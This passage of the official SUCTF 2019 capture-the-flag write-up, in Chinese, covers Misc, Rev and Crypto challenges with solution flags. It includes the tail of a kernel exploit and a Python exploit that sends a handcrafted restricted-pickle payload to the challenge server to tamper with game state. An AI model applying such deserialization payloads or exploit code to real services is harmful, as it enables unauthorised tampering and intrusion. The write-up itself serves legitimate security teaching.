memset(buf3,0,2*CRED_SIZE);</span></span><br><span class="line"><span class="comment">		set(fd2,buf3,2*CRED_SIZE);</span></span><br><span class="line"><span class="comment">		//su_malloc(fd1,CRED_SIZE);</span></span><br><span class="line"><span class="comment">		//set(fd1,buf2,CRED_SIZE);</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//	close(fd2);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2><span id="misc">Misc</span><a href="#misc" class="header-anchor"></a></h2><h3><span id="qian-dao-ti">签到题</span><a href="#qian-dao-ti" class="header-anchor"></a></h3><p>把 base64 转成图片就行了</p>
<p>有些师傅说字母看不清…其实签到题来源于最近一个比较火的梗…看不清我觉得没多大影响…大不了一个个试试看嘛（手动狗头</p>
<h3><span id="game">game</span><a href="#game" class="header-anchor"></a></h3><p>纯粹是脑洞题，从<code>find my secret</code> 去找前端js里的<code>secret</code>字符串，找到之后得到一张图片，lsb里有加密字符串，用的3des加密，密钥为完成魔方后得到的假flag，本以为会被秒，脑洞实在是太无聊了,(逃</p>
<h3><span id="guess-game">guess_game</span><a href="#guess-game" class="header-anchor"></a></h3><p>pickle 本质是个栈语言, 不同于 json 亦或是 php 的 serialize. 实际上是运行 pickle 得到的结果是被序列化的对象. 这里虽然条件受限, 只能加载指定模块, 但是可以看到 <code>__init.py__</code> 中 <code>game = Game()</code>, 所以只要构造出 pickle 代码获得 guess_game.game, 然后修改 game 的 win_count 和 round_count 即可.<br>注意如果是 <code>from guess_game import game</code>, 然后修改再 dumps 这个 game 的话, 是在运行时重新新建一个 Game 对象, 而不是从 guess_game 这个 module 里面获取. 所以这里必须手写&#x2F;更改一下 dumps 生成的 pickle, </p>
<p>然后注意</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ticket = restricted_loads(ticket)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">type</span>(ticket) == Ticket</span><br></pre></td></tr></table></figure>

<p>所以还需要栈顶为一个 Ticket, 这比较方便, 可以 dumps 一个 Ticket 拼到之前手写的后面就可以了.</p>
<p>dockerfile: <a href="https://github.com/rmb122/suctf2019_guess_game/">https://github.com/rmb122/suctf2019_guess_game/</a><br>ref: <a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a><br>exp:  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;47.111.59.243&#x27;</span>, <span class="number">8051</span>))</span><br><span class="line"></span><br><span class="line">exp = <span class="string">b&#x27;&#x27;&#x27;cguess_game</span></span><br><span class="line"><span class="string">game</span></span><br><span class="line"><span class="string">&#125;S&quot;win_count&quot;</span></span><br><span class="line"><span class="string">I10</span></span><br><span class="line"><span class="string">sS&quot;round_count&quot;</span></span><br><span class="line"><span class="string">I9</span></span><br><span class="line"><span class="string">sbcguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\xffsb.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">s.send(struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="built_in">len</span>(exp)))</span><br><span class="line">s.send(exp)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">1024</span>))</span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">1024</span>))</span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">1024</span>))</span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">1024</span>))</span><br></pre></td></tr></table></figure>
<h3><span id="homerouter">homerouter</span><a href="#homerouter" class="header-anchor"></a></h3><p>题目的附件给出的是一个固件文件，提取文件系统后我们可以发现是OpenWrt。结合题目名称和<code>/etc/config/easycwmp</code>文件，查阅一下资料后我们可以发现这道题的内容和<code>tr069</code>有关，相信家里用电信光猫的同学应该不陌生，这个东西具体是用来干什么的这里就不做赘述了。当明白了这道理的考察点之后后续工作就不算困难了，一种做法是找一个OpenWrt的路由器模拟出环境，将固件中存在的和easycwmp相关的配置文件添加到模拟环境中即可，只是这样需要硬件设备支持。实际上我们打开easycwmp项目可以发现完全可以在x86环境下编译运行，官方给出了也较为详细的编译指南。编译成功后同样将固件中的配置文件添加进来，使用前台log模式即可发现，ACS服务器下发了一个修改系统root密码的指令，而密码就是该题的flag：<code>Hello_tr_069_Protocol</code>。</p>
<h3><span id="protocol">protocol</span><a href="#protocol" class="header-anchor"></a></h3><p>打开<code>pcapng</code>文件后我们可以发现这是一段USB流量，观察一些流量我们可以发现出现了<code>opendeck</code>字符串和一个假的flag，结合开源的提示我们可以找到两个项目<a href="github.com/summershrimp/opendeck-linux">opendeck-linux</a>和<a href="github.com/summershrimp/opendeck-linux">opendeck-gui</a>，注意有一个同名的项目不要搞错了。大致观察下这两个项目的代码，我们可以发现题目给出的流量正是gui项目所读取的流量。</p>
<p>kernel运行在一个连接触摸屏的Linux设备上，而gui项目一方面解析经过USB发来的信息，将一些png图片显示触摸屏上，一方面响应触摸屏上的输入信息，并将输入信息发到USB对端。在源码中我们可以发现该程序的运行原理是：对端一次性发送15张png图片，每一张图片是一个字符，按照数据部分第3个字节表示的数字显示在屏幕上；接下来读取触摸屏上输出的点击信息，如果点击正确那么对端发来一张空图片覆盖掉点击位置（可以理解为清空该位置图像），等到该组中有10个字符消失后开始下一组。整个流量中包含了5组上述过程。</p>
<p>知道程序的大致运行原理了后该题就不难了，首先将流量包中的png图片全部提取，接下来用<code>tshark</code>将leftover data提取出来，解析位置信息就可以得到每次点击的字符。将所有的字符连起来即可得到flag<code>suctf&#123;My_usb_pr0toco1_s0_w3ak&#125;</code>。</p>
<h2><span id="rev">Rev</span><a href="#rev" class="header-anchor"></a></h2><h3><span id="hardcpp">hardCpp</span><a href="#hardcpp" class="header-anchor"></a></h3><p>比较简单，签到的…<br>exp如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">21</span>; i++) &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> c;</span><br><span class="line">	c = input[i] ^ (<span class="type">char</span>)times;</span><br><span class="line">	c = <span class="built_in">c_add</span>(c)(<span class="built_in">c_mod</span>(input[i - <span class="number">1</span> + times])(<span class="number">7</span>));</span><br><span class="line">	<span class="comment">//c += flag[i - 1] % 7;</span></span><br><span class="line">	c = <span class="built_in">c_xor</span>(c)(<span class="built_in">c_add</span>(<span class="built_in">c_mul</span>(<span class="built_in">c_xor</span>(input[i - <span class="number">1</span> + times])(<span class="number">0x12</span>))(<span class="number">3</span>))(<span class="number">2</span>));</span><br><span class="line">	<span class="comment">//c ^= (3 * (flag[i - 1] ^ 0x12) + 2);</span></span><br><span class="line">	<span class="keyword">if</span> (enc[i - <span class="number">1</span>] != c) &#123;</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>里面有个时间反调，要求必须时间差必须为0</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(times &gt; <span class="number">0</span>)&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Let the silent second hand take the place of my doubt...&quot;</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>时间差会被加在数组下标里，然而因为预期是0，所以没什么影响</p>
<h3><span id="rev">rev</span><a href="#rev" class="header-anchor"></a></h3><p>程序用IDA打开很复杂</p>
<p>一开始用<code>boost::tokenizer</code>切割字符串</p>
<p>输入形如<code>aaaa-bbbbb-cccccc</code>，中间的特殊符号会被认为是分隔符，然后获得这三个<code>std::string</code>，分别check</p>
<p>第一个，res[0]，要求长度是10，然后经过</p>
<p><code>boost::trim_left_copy_if(res[0], boost::is_any_of(&quot;1&quot;))</code></p>
<p>这句话是把这个字符串左边的<code>1</code>全部去掉</p>
<p>进入一个循环，要求每个字符异或0xab后和数组相同，长度要求是5，也就是说一开始被去掉了五个<code>1</code></p>
<p>于是输入的第一段是<code>11111suctf</code></p>
<p>第二个，res[1]，</p>
<p><code>((res[1].length() == 4) &amp;&amp;</code></p>
<p><code>(boost::all(res[1],boost::is_from_range(&#39;a&#39;,&#39;g&#39;)</code></p>
<p><code>|| boost::is_from_range(&#39;A&#39;, &#39;G&#39;)))) </code></p>
<p>长度是4，每个字符都是[A-Ga-g]</p>
<p>经过<code>boost::to_upper</code>要求和原string相同，这表明输入的4个字符都是大写字母</p>
<p>限制范围在[A-G]了</p>
<p>要求4个字符的数值递增，步长为2,</p>
<p>那么只能ACEG</p>
<p>也就是第二个的输入</p>
<p>第三个，res[2]</p>
<p>通过<code>boost::all(res[2],boost::is_digit())</code>判断要求都是数字，小于10位，转成int，记作sum</p>
<p>要求<code>(sum % 2 == 0) &amp;&amp; (func(sum) == -1412590079) &amp;&amp; (func2(sum) == 305392417)</code></p>
<p>如果不加第一个%2&#x3D;&#x3D;0的条件，会有三个结果31415925 31415926 31415927</p>
<p>这样下来只有一个结果31415926</p>
<p>int范围内只有这一个符合要求</p>
<p>也就是第三个输入</p>
<p>那么输入就形如<code>11111suctf-ACEG-31415926</code></p>
<p>输出为  suctf{ACEG31415926}<br>You win!</p>
<h3><span id="akira-homework">Akira Homework</span><a href="#akira-homework" class="header-anchor"></a></h3><p>程序是一个Windows下的程序，开始的时候会要求输入密码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[+]======================[+]</span><br><span class="line">[+] Akira&#x27;s Homework 2nd [+]</span><br><span class="line">[+]======================[+]</span><br><span class="line">[=] My passwords is:</span><br></pre></td></tr></table></figure>
<p>分析可以直接使用ida对程序逻辑进行分析。从程序的某些迹象中可以发现，大部分的字符串似乎都被加密了。并且当用调试器连接的时候，程序会直接强行关闭，程序运行时间长也会自行关闭。解决方案可以是Patch程序的反调试逻辑等。这边提出的解决方案是使用dmp的方式结合着分析程序，这样能够提高解答的速度。通过dmp的方式，能够找到程序的第一个输入点:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>( i=<span class="number">0</span>; i &lt; <span class="number">0x6c</span>; ++<span class="number">1</span>)</span><br><span class="line">   Str[i] ^= byte_7ff766972AE0[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">puts</span>(Str)</span><br><span class="line">sub_7FF76959C80(<span class="string">&quot;%18s&quot;</span>, &amp;v4, <span class="number">19</span>i64);</span><br></pre></td></tr></table></figure>
<p>直接逆向这一段，能够找到程序当前使用的密钥为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Akira_aut0_ch3ss_!</span><br></pre></td></tr></table></figure>
<p>输入这段逻辑，此时会发现程序提示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Have no sign!</span><br></pre></td></tr></table></figure>
<p>返回程序检查，会发现有一个check逻辑<code>int sub_7FF682FC93B0()</code>，里面检查了一个叫做<code>Alternate Data Streams</code>的东西，并且将这个数据做了一次<code>md5</code>签名检查，通过查询可以查到签名内容为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Overwatch</span><br></pre></td></tr></table></figure>
<p>给<code>exe</code>加上<code>Alertable Data Streaming</code>之后，就能够通过检测。在刚刚的提示框后，会要求输入第二次答案，这个答案才是flag:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Now check the sign:</span><br></pre></td></tr></table></figure>
<p>dmp下程序后，会发现还有一个dll也藏在进程中。将DLL取出逆向，观测可知，其尝试打开了一个<code>ShareMemory</code>，并且读出了里面的内容，传入了函数<code>sub_180011136</code>。所以这里猜测，在这个程序运行的过程中，在主线程中必定也存在一个对称操作。于是检查原先的exe，找到调用<code>MapViewOfFile</code>的周围</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:000000014000771F                 mov     [rsp+0B8h+Src], 7Ch</span><br><span class="line">.text:0000000140007727                 mov     [rsp+0B8h+var_2F], 45h</span><br><span class="line">.text:000000014000772F                 mov     [rsp+0B8h+var_2E], 38h</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>如果使用了工具分析这个dmp下来的dll，会发现其中有一个类似AES算法的东西，也就是这个<code>sub_180011136</code>函数的。最终可以解得flag为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Ak1rAWin!&#125;</span><br></pre></td></tr></table></figure>
<p><em>吐槽：题目没有设计好，导致DLL的解密逻辑好像很容易被找出来，结果很多师傅似乎拿到第一个key之后直接就解开了dll。。。本意是想让大家了解一下Windows下的ADS作为签名的用途的。果然还是出题人太菜了</em></p>
<h3><span id="signin">SignIn</span><a href="#signin" class="header-anchor"></a></h3><p>使用了gmp大数库实现了一个简单的rsa,题目中只有N e,由于N不是很大,可以直接分解,得到p q,然后生成d,即可解出flag</p>
<h3><span id="babyunic">babyunic</span><a href="#babyunic" class="header-anchor"></a></h3><p>先放上源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unicorn/unicorn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADDRESS 0x400000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACK 0x10000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SZ 0x200000</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> flagenc[<span class="number">50</span>] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x94ffffff</span>,<span class="number">0x38ffffff</span>,<span class="number">0x26010000</span>,<span class="number">0x28ffffff</span>,<span class="number">0x10fcffff</span>,<span class="number">0x94020000</span>,<span class="number">0x9efcffff</span>,<span class="number">0xea060000</span>,<span class="number">0xdc000000</span>,<span class="number">0x6000000</span>,<span class="number">0xcffffff</span>,<span class="number">0xf6fdffff</span>,<span class="number">0x82faffff</span>,<span class="number">0xd0fcffff</span>,<span class="number">0x82010000</span>,<span class="number">0xde030000</span>,<span class="number">0x4e010000</span>,<span class="number">0xb2020000</span>,<span class="number">0xd8f8ffff</span>,<span class="number">0x74010000</span>,<span class="number">0xa6faffff</span>,<span class="number">0xd4f9ffff</span>,<span class="number">0xc2010000</span>,<span class="number">0x7cf9ffff</span>,<span class="number">0x5a030000</span>,<span class="number">0x46010000</span>,<span class="number">0x3cffffff</span>,<span class="number">0x14faffff</span>,<span class="number">0xce010000</span>,<span class="number">0xdc070000</span>,<span class="number">0x48fdffff</span>,<span class="number">0x98000000</span>,<span class="number">0x5e080000</span>,<span class="number">0xb0fdffff</span>,<span class="number">0xbcffffff</span>,<span class="number">0x6e030000</span>,<span class="number">0x4effffff</span>,<span class="number">0x36f8ffff</span>,<span class="number">0xc0050000</span>,<span class="number">0xae060000</span>,<span class="number">0x94060000</span>,<span class="number">0x22000000</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">calc</span><span class="params">(<span class="type">char</span> * input,<span class="type">char</span> * output,<span class="type">char</span> * filename)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    uc_engine *uc;</span><br><span class="line">    FILE * file = fopen(filename,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> * opc = <span class="built_in">malloc</span>(<span class="number">0x7100</span>);</span><br><span class="line">    fread(opc,<span class="number">1</span>,<span class="number">0x7100</span>,file);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> sp = STACK + SZ - <span class="number">0x40</span>;</span><br><span class="line">    <span class="type">int</span> fp = STACK + SZ - <span class="number">0x40</span>;</span><br><span class="line">    <span class="type">int</span> a0 = STACK + SZ - <span class="number">0x500</span>;</span><br><span class="line">    <span class="type">int</span> a1 = STACK + SZ - <span class="number">0x600</span>;</span><br><span class="line"></span><br><span class="line">    uc_open(UC_ARCH_MIPS, UC_MODE_MIPS32 + UC_MODE_BIG_ENDIAN, &amp;uc);</span><br><span class="line"></span><br><span class="line">    uc_mem_map(uc, ADDRESS, SZ, UC_PROT_ALL);</span><br><span class="line">    uc_mem_map(uc, STACK, SZ, UC_PROT_ALL);</span><br><span class="line">    uc_mem_write(uc , a0,input,<span class="built_in">strlen</span>(input));</span><br><span class="line">    uc_mem_write(uc, ADDRESS,opc, <span class="number">0x7100</span>);</span><br><span class="line"></span><br><span class="line">    uc_reg_write(uc, UC_MIPS_REG_SP, &amp;sp);</span><br><span class="line">    uc_reg_write(uc, UC_MIPS_REG_FP, &amp;fp);</span><br><span class="line">    uc_reg_write(uc, UC_MIPS_REG_A1, &amp;a1);</span><br><span class="line">    uc_reg_write(uc, UC_MIPS_REG_A0, &amp;a0);</span><br><span class="line"></span><br><span class="line">    uc_emu_start(uc, ADDRESS, ADDRESS + <span class="number">0x7070</span> - <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    uc_mem_read(uc, STACK + SZ - <span class="number">0x600</span>,output,<span class="number">200</span>);</span><br><span class="line">    </span><br><span class="line">    uc_close(uc);</span><br><span class="line">    fclose(file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __attribute__((constructor)) check()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(ptrace(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)==<span class="number">-1</span>)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc == <span class="number">2</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;SUCTF 2019&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;input your flag:&quot;</span>);</span><br><span class="line">        <span class="type">char</span> * output = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">        <span class="type">char</span> * input = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%50s&quot;</span>,input);</span><br><span class="line">        calc(input,output,argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">memcmp</span>(output,flagenc,<span class="number">168</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;congratuation!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;fail!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;no input files&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 出这个题的原因是最近在看各种奇奇怪怪的fuzz,8月初平安银河实验室推了一个基于libfuzzer和unicorn模拟执行的fuzzing工具,是利用了unicorn来进行模拟执行,然后利用libfuzzer提供的__libfuzzer_extra_counters接收覆盖率,进行数据的变异等操作<br> 出题的时候使用的是mips-linux-gnu-gcc在ubuntu1604下编译出的一个大端序的mips32,这里编写了一个类似<code>void func(char * in,char * out)</code>的函数,因为unicorn对于原生函数的调用的支持不是很好,所以这个函数里面没有用到库函数以及系统调用<br> 函数里设置了一个位运算,以及一个42元方程,函数运行后会返回方程的值,这里的值也是大端序的,然后进行比较.题目无混淆无花,模拟执行的算法也是很基础的,事先也给了依赖库,目的是想让各位师傅们了解一下这个神奇的模拟引擎(希望我不是最后一个知道的),在出题的过程中也发现了一个问题就是z3对于这个42元方程的速度异常的慢.<br> 这个场景下的unicorn感觉可以用在iot的fuzz上,不过要注意的是这东西毕竟是模拟执行,所以效率不是很高</p>
<p> 解题思路就是学一波unicorn,然后根据uc_open函数参数的值找到要模拟字节码的架构,然后使用对应的反编译工具对func文件进行逆向,dump出大端序的res,用求解器算出flag</p>
<h2><span id="crypto">Crypto</span><a href="#crypto" class="header-anchor"></a></h2><p> 详情见 <a href="http://team-su.github.io/passages/2019-08-22-SUCTF/Crypto-WriteUp.html">Writeup.html</a>。</p>
</div><div class="article-licensing box"><div class="licensing-title"><p>SUCTF 2019 官方 Write up</p><p><a href="https://team-su.github.io/posts/50499.html">https://team-su.github.io/posts/50499.html</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>SUers</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2019-08-22</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2025-07-13</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/SUCTF/">SUCTF</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/posts/19336.html"><i class="level-item fas fa-chevron-left"></i><span class="level-item">ByteCTF 2019 SU Write Up</span></a></div></nav><!--!--></div><!--!--><div class="column column-right  order-3 is-sticky"><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a><p class="is-size-7"><span>&copy; 2025 SUers</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2016</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/team-su"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/javascript" id="MathJax-script" async>MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      },
      svg: {
        fontCache: 'global'
      },
      chtml: {
        matchFontHeight: false
      }
    };</script><script src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script data-pjax src="/js/insight.js" defer></script><script data-pjax>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>